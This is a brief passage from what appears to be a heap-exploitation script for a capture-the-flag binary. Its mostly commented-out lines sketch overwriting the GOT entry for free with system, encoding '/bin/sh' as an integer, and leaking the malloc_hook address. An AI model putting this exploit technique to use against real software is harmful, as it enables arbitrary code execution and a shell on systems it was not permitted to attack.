...
#write(bytes(hex(exe.symbols["got.free"]),"utf-8"),9,p64(system))
#bin_sh_as_an_int = 3414407389463668746
##REMEMBER IT HAS TO BE INVERTED
#bin_sh_as_an_int = 749975985510244911
#write(bytes(hex(max_heap_addr),"utf-8"),9,b"\x00"*8)
#show(arbitrary,1)
show(bytes(hex(malloc_hook_addr),"utf-8"),1)
#malloc(bin_sh_as_an_int,"FUCK")
